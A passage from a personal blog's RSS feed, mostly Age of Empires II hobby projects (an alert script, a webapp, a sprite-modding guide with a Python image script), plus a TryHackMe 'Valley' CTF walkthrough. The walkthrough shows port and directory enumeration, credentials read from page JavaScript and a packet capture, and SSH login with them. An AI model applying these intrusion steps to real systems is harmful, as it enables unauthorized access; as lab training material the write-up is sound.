In this sense I came up with the idea of creating a python script that, using pyautogui, checks if there are villagers being created in the production queue, and if not, plays a sound alert.&lt;/p&gt;
&lt;p&gt;The idea then was for the script to have the villager icon and look for that image in the production queue.
The first problem I faced is that the villagers can be male or female. I decided to solve this by modifying the female villager icon inside the game, so that it also uses the image of the male villager.&lt;/p&gt;
&lt;p&gt;For it I modified the file at&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\AoE2DE\widgetui\icons.json
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and in the Units entry I assigned the same value to the units 015 and 016.&lt;/p&gt;
&lt;p&gt;This solved the first problem, but a second one arises: in the production queue there is a progress bar over the icon of the unit being created. This prevented pyautogui from recognizing the icon correctly. This could be solved by decreasing the CONFIDENCE_LEVEL to 0.6.&lt;/p&gt;
&lt;p&gt;Then I just set the script to be on a loop and check every 3 seconds.&lt;/p&gt;
&lt;h2&gt;Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;pyautogui&lt;/li&gt;
&lt;li&gt;playsound==1.2.2&lt;/li&gt;
&lt;li&gt;opencv-python&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/user-attachments/assets/60a7ab70-ac00-4738-8aeb-8733d6116bf2&quot; alt=&quot;output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Age Of Empires II - Webapp.</title><link>https://alan.com.ar/posts/ageofempireswebapp/</link><guid isPermaLink="true">https://alan.com.ar/posts/ageofempireswebapp/</guid><pubDate>Sat, 03 May 2025 03:56:54 GMT</pubDate><content:encoded>&lt;p&gt;::github{repo=&quot;athekat/aoewebapp&quot;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://aoewebapp.alan.com.ar/&quot;&gt;website&lt;/a&gt;. Hosted with &lt;a href=&quot;https://railway.com/&quot;&gt;Railway&lt;/a&gt; for as long as the free trial plan lasts.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Web application made with  and Django. The user inputs an Age of Empires II player&apos;s ID and the application retrieves information about the current (or last) match. It shows the player&apos;s name, elo, color, map, civs chosen and their information and bonuses, using data from &lt;a href=&quot;https://aoe2techtree.net/&quot;&gt;aoe2techtree&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;To run locally&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Install requirements.txt&lt;/li&gt;
&lt;li&gt;Run &apos;manage.py runserver&apos; using Python.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;images/aoewebapp.png&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - Visual Mods and changing sprites.</title><link>https://alan.com.ar/posts/aoevisualmods/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoevisualmods/</guid><pubDate>Sun, 19 Jan 2025 03:24:52 GMT</pubDate><content:encoded>&lt;p&gt;In this guide, Ill walk you through the process of changing the sprites for &lt;em&gt;Age of Empires II: Definitive Edition&lt;/em&gt; (AoE2 DE). Well be using a few tools to extract, edit, and reimplement custom sprites into the game.&lt;/p&gt;
&lt;h3&gt;Tools Youll Need:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SLD Extractor&lt;/strong&gt;: &lt;a href=&quot;https://gamebanana.com/tools/download/13516#&quot;&gt;Download here&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SLX Studio&lt;/strong&gt;: &lt;a href=&quot;https://ageofempires.fandom.com/wiki/SLX_Studio&quot;&gt;Download here&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AdvancedGenieEditor3&lt;/strong&gt;: Located in the games directory (e.g., &lt;code&gt;C:\Program Files (x86)\Steam\steamapps\common\AoE2DE\Tools_Builds&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Steps to Change Sprites:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Extract the Sprite Files&lt;/strong&gt;&lt;br /&gt;
First, we use &lt;strong&gt;SLD Extractor&lt;/strong&gt; to convert the in-game sprite files (.sld) into PNG images and CSV files, which we can then edit. These sprite files are found in:&lt;br /&gt;
&lt;code&gt;C:\Program Files (x86)\Steam\steamapps\common\AoE2DE\resources\_common\drs\graphics&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Edit the Sprites in SLX Studio&lt;/strong&gt;&lt;br /&gt;
Open &lt;strong&gt;SLX Studio&lt;/strong&gt; and load the folder containing the PNG files you edited.
Set the anchor values for all images. The values are in the csv files. Then, in the &lt;em&gt;Tool&lt;/em&gt; menu, use the &lt;strong&gt;Generate Data Graphic&lt;/strong&gt; option.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Turn off the &lt;em&gt;Mask&lt;/em&gt; setting.&lt;/li&gt;
&lt;li&gt;Turn on the &lt;em&gt;Shadow&lt;/em&gt; setting, and adjust the shadow colors by modifying the alpha values.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;images/aoevisualmods/Shadows.jpg&quot; alt=&quot;SlX Studio&quot; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Export the Sprite&lt;/strong&gt;&lt;br /&gt;
After making your changes, save the SLX file. Then export it to SMX format, keeping the shadow alphas intact.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Place the File in the Correct Directory&lt;/strong&gt;&lt;br /&gt;
Place the exported SMX file in the following directory:&lt;br /&gt;
&lt;code&gt;C:\Users\User\Games\Age of Empires 2 DE\{PROFILE_NUMBER}\mods\local\EliteMangu\resources\_common\drs\graphics&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rename the SLX File&lt;/strong&gt;&lt;br /&gt;
Youll need to rename the SLX file based on the graphic ID of the unit. To find this ID, open &lt;strong&gt;AdvancedGenieEditor3&lt;/strong&gt;, go to the &lt;em&gt;Units&lt;/em&gt; tab, and search for the unit youre editing. There, youll find the units graphic ID. Next, move to the &lt;em&gt;Graphics&lt;/em&gt; tab, search for that ID, and youll get the file name you need.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Activate Your Custom Sprite in the Game&lt;/strong&gt;&lt;br /&gt;
If everything was done correctly, the new sprite should now appear in the &lt;em&gt;Local Mods&lt;/em&gt; section of AoE2 DE. Simply activate the mod, and you should see your custom sprites in the game.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;My Custom Project: Adding a Badge to Elite Mangudai&lt;/h3&gt;
&lt;p&gt;For my project, I decided to add a badge to the &lt;em&gt;Elite Mangudai&lt;/em&gt; so it can be easily distinguished from the non-elite unit. This was tricky because both units share the same sprite.&lt;/p&gt;
&lt;p&gt;To add the badge, I used a Python script to edit all the PNG files in batch, so I wouldnt have to manually place the logo on every single image.&lt;/p&gt;
&lt;p&gt;Heres the Python code I used:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from PIL import Image
import os

def add_logo_to_image(image_path, logo_path, output_path, logo_position):
    try:
        img = Image.open(image_path)
        logo = Image.open(logo_path)

        # Ensure logo is RGBA for transparency
        logo = logo.convert(&quot;RGBA&quot;)

        # Resize the logo if needed
        logo = logo.resize((12, 12)) 

        img.paste(logo, logo_position, mask=logo)
        img.save(output_path)
        print(f&quot;Processed: {image_path}&quot;)
    except FileNotFoundError:
        print(f&quot;Error: File not found: {image_path} or {logo_path}&quot;)
    except Exception as e:
        print(f&quot;Error processing {image_path}: {e}&quot;)

logo_path = &quot;logo2.png&quot;
logo_position = (80, 40) 

for filename in os.listdir(&quot;.&quot;): 
    if filename.lower().endswith((&quot;.png&quot;)) and filename.lower() != &quot;logo2.png&quot;:
        image_path = filename
        output_path = f&quot;{filename}&quot;
        add_logo_to_image(image_path, logo_path, output_path, logo_position)

print(&quot;Finished&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Result&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;images/aoevisualmods/elitemangudai.png&quot; alt=&quot;EliteMangudai&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Adding the New Dat File in AdvancedGenieEditor3&lt;/h3&gt;
&lt;p&gt;Once the badges were added, I went to &lt;strong&gt;AdvancedGenieEditor3&lt;/strong&gt; to generate a new DAT file. There I needed to create a new graphic entry, and link it to the Elite Manguai unit. The new DAT file should be placed in:&lt;br /&gt;
&lt;code&gt;C:\Users\User\Games\Age of Empires 2 DE\{PROFILE_NUMBER}\mods\local\EliteMangu\resources\_common\dat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Make sure the DAT file is placed in your users directory (as shown above), not the Steam directory, as putting it in the Steam folder will cause the game to crash.&lt;/p&gt;
&lt;h3&gt;Result&lt;/h3&gt;
&lt;p&gt;Everything worked great! The sprites now display in the game. However, the shadows are a bit off, so Ill need to tweak the alpha values a little more to get them looking just right.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/aoevisualmods/output.png&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Walkthrough: Valley CTF - TryHackMe.</title><link>https://alan.com.ar/posts/valley/</link><guid isPermaLink="true">https://alan.com.ar/posts/valley/</guid><pubDate>Wed, 08 Jan 2025 03:24:52 GMT</pubDate><content:encoded>&lt;h3&gt;Beginner level ctf.&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/r/room/valleype&quot;&gt;Link to the room&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Can you find your way into the Valley?&lt;/p&gt;
&lt;p&gt;Answer the questions below&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What is the user flag?&lt;/li&gt;
&lt;li&gt;What is the root flag?&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since we don&apos;t care being noticed, we can run &lt;a href=&quot;https://github.com/RustScan/RustScan&quot;&gt;rustscan&lt;/a&gt;, which is faster than nmap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$rustscan -a 10.10.91.79
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;PORT&lt;/th&gt;
&lt;th&gt;STATE&lt;/th&gt;
&lt;th&gt;SERVICE&lt;/th&gt;
&lt;th&gt;REASON&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;37370/tcp&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;unknown&lt;/td&gt;
&lt;td&gt;syn-ack&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;Port 22 doesn&apos;t allow anon login, so we move forward.&lt;/p&gt;
&lt;p&gt;We access the site via web browser.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;index.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;pricing.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;gallery.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Not much to see in the source code. Also nothing relevant in styles.css&lt;/p&gt;
&lt;p&gt;We run gobuster on port 80 in case we miss anything:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$gobuster dir --url http://10.10.91.79:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/gallery&lt;/td&gt;
&lt;td&gt;(Status: 301)&lt;/td&gt;
&lt;td&gt;[Size: 312]&lt;/td&gt;
&lt;td&gt;[--&amp;gt; http://10.10.91.79/gallery/]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/static&lt;/td&gt;
&lt;td&gt;(Status: 301)&lt;/td&gt;
&lt;td&gt;[Size: 311]&lt;/td&gt;
&lt;td&gt;[--&amp;gt; http://10.10.91.79/static/]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/pricing&lt;/td&gt;
&lt;td&gt;(Status: 301)&lt;/td&gt;
&lt;td&gt;[Size: 312]&lt;/td&gt;
&lt;td&gt;[--&amp;gt; http://10.10.91.79/pricing/]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;/static --&amp;gt; we can&apos;t see any file there.&lt;/p&gt;
&lt;p&gt;/pricing --&amp;gt; a note.txt file and the html file.&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;note.txt&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;J,&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Please stop leaving notes randomly on the website&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-RP&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;/gallery --&amp;gt; just the html file.&lt;/p&gt;
&lt;p&gt;We dig deeper in the found directories.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~/Documents]
$gobuster dir --url http://10.10.91.79:80/static -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Starting gobuster in directory enumeration mode&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;/11                   (Status: 200) [Size: 627909]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/12                   (Status: 200) [Size: 2203486]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/3                    (Status: 200) [Size: 421858]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/10                   (Status: 200) [Size: 2275927]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/13                   (Status: 200) [Size: 3673497]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/16                   (Status: 200) [Size: 2468462]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/6                    (Status: 200) [Size: 2115495]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/18                   (Status: 200) [Size: 2036137]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/1                    (Status: 200) [Size: 2473315]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/9                    (Status: 200) [Size: 1190575]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/5                    (Status: 200) [Size: 1426557]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/14                   (Status: 200) [Size: 3838999]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/17                   (Status: 200) [Size: 3551807]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/7                    (Status: 200) [Size: 5217844]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/8                    (Status: 200) [Size: 7919631]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/15                   (Status: 200) [Size: 3477315]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;/00                   (Status: 200) [Size: 127]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;/00 seems to be an outlier. In there we found some notes:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;dev notes from valleyDev:&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-add wedding photo examples&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-redo the editing on #4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-remove /dev1243224123123&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-check for SIEM alerts&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;We check if /dev1243224123123 is still up.&lt;/p&gt;
&lt;p&gt;It is. There&apos;s a login page. In the source code we find 2 .js files. One of them includes:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;loginButton.addEventListener(&quot;click&quot;, (e) =&amp;gt; {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === &quot;siemDev&quot; &amp;amp;&amp;amp; password === &quot;california&quot;) {
        window.location.href = &quot;/dev1243224123123/devNotes37370.txt&quot;;
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Going to /dev1243224123123/devNotes37370.txt we get more notes:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;dev notes for ftp server&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-stop reusing credentials&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-check for any vulnerabilies&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-stay up to published on patching&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-change ftp port to normal port&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;Since it mentioned the port, we check that weird tcp port we found with rustscan. We check if dev is reusing credentials. It is, we can log in.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)-[~]
$ ftp 10.10.91.79 -P 37370  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There we found some pcapng files.&lt;/p&gt;
&lt;p&gt;Results:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-rw-rw-r--&lt;/td&gt;
&lt;td&gt;1 1000&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;7272&lt;/td&gt;
&lt;td&gt;Mar 06  2023&lt;/td&gt;
&lt;td&gt;siemFTP.pcapng&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-rw-r--&lt;/td&gt;
&lt;td&gt;1 1000&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;1978716&lt;/td&gt;
&lt;td&gt;Mar 06  2023&lt;/td&gt;
&lt;td&gt;siemHTTP1.pcapng&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-rw-r--&lt;/td&gt;
&lt;td&gt;1 1000&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;1972448&lt;/td&gt;
&lt;td&gt;Mar 06  2023&lt;/td&gt;
&lt;td&gt;siemHTTP2.pcapng&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;We open them with Wireshark:&lt;/p&gt;
&lt;p&gt;In siemFTP.pcanpng we found the existencie of some files which may or may not be relevant:
Line-based text data (6 lines).&lt;/p&gt;
&lt;p&gt;siemFTP.pcanpng&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;AnnualReport.txt\r\n&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;BusinessReport.t&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;CISOReport.txt\r\n&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;HrReport.txt\r\n&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;ItReport.txt\r\n&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-rw-r--r--&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;Mar 06 13:27&lt;/td&gt;
&lt;td&gt;SecurityReport.txt\r\n&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;In siemHTTP.pcanpg we found nothing. Everything&apos;s encrypted.&lt;/p&gt;
&lt;p&gt;In siemHTTP2.pcanpg we found a package with the following information:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: &quot;uname&quot; = &quot;valleyDev&quot;
    Form item: &quot;psw&quot; = &quot;ph0t0s1234&quot;
    Form item: &quot;remember&quot; = &quot;on&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can use that to access via ssh:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(kalikali)
$ ssh valleyDev@10.10.91.79
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As soon as we access there is a user.txt file containing the first flag.&lt;/p&gt;
&lt;p&gt;Next flag to be continued...&lt;/p&gt;
</content:encoded></item><item><title>Age Of Empires II - Clan Webpage.</title><link>https://alan.com.ar/posts/ageofempiresclan/</link><guid isPermaLink="true">https://alan.com.ar/posts/ageofempiresclan/</guid><pubDate>Fri, 11 Oct 2024 03:56:54 GMT</pubDate><content:encoded>&lt;p&gt;::github{repo=&quot;athekat/Aoe-SiemprePobresClan&quot;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/Aoe-SiemprePobresClan/&quot;&gt;GitHub repository&lt;/a&gt; and the &lt;a href=&quot;https://siemprepobres.alan.com.ar/&quot;&gt;website&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is a simple webpage made with &lt;a href=&quot;https://getbootstrap.com/&quot;&gt;Bootstrap&lt;/a&gt; that shows some stats from an Age Of Empires II Clan I have with some friends.&lt;/p&gt;
&lt;p&gt;The information is gathered using a Python script that interacts with external APIs (like &lt;a href=&quot;https://wiki.librematch.org/rlink/community/start&quot;&gt;LibreMatch&lt;/a&gt; and &lt;a href=&quot;https://www.aoe2companion.com/&quot;&gt;Aoe2 Companion&lt;/a&gt;), saves them to a json file and then is retrieved using a js script.&lt;/p&gt;
&lt;p&gt;The 1v1 elo chart is generated with &lt;a href=&quot;https://plotly.com/&quot;&gt;Plotly&lt;/a&gt; using &lt;a href=&quot;https://ratings.aoe2.se/&quot;&gt;Age of Empires II: Definitive Edition Rating Charts&lt;/a&gt; data.&lt;/p&gt;
&lt;p&gt;Everything is automatically uppublishedd using GitHub Actions.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/ageofempiresclan/output.jpg&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - Current Match (Python Script).</title><link>https://alan.com.ar/posts/aoecurrentmatch/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoecurrentmatch/</guid><pubDate>Sun, 22 Sep 2024 08:45:06 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/Aoe-CurrentMatchPy/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This code fetches information about the most recent (or ongoing) Age of Empires II match played by a specific profile and gives details such as ELO rating, civ and bonuses.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Functions:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;get_civilization_descriptions(file_path): This function reads a JSON file containing civilization descriptions and bonuses, and returns a dictionary where the key is the civilization name and the value is its description.&lt;/li&gt;
&lt;li&gt;get_match_info(api_url, civilizations_file): This is the main function that retrieves and processes match data.
&lt;ul&gt;
&lt;li&gt;It takes the API URL and the path to the civilization data file as input.&lt;/li&gt;
&lt;li&gt;It sends a request to the provided API to get match information for a specific profile.&lt;/li&gt;
&lt;li&gt;If the request is successful (status code 200), it parses the JSON response and extracts details of the most recent match, including map name, start time, and player information (names, ratings, and civilizations).&lt;/li&gt;
&lt;li&gt;It then calls the get_civilization_descriptions function to get descriptions for each player&apos;s civilization from the provided file.&lt;/li&gt;
&lt;li&gt;Finally, it returns a dictionary containing all the retrieved match information, including player details and civilization descriptions.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/aoecurrentmatch/AoeCurrentMatchoutput.jpg&quot; alt=&quot;Output&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Skills Assessment - Windows Event Logs &amp; Finding Evil - HackTheBox.</title><link>https://alan.com.ar/posts/windowseventlogshtb/</link><guid isPermaLink="true">https://alan.com.ar/posts/windowseventlogshtb/</guid><pubDate>Sun, 15 Sep 2024 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
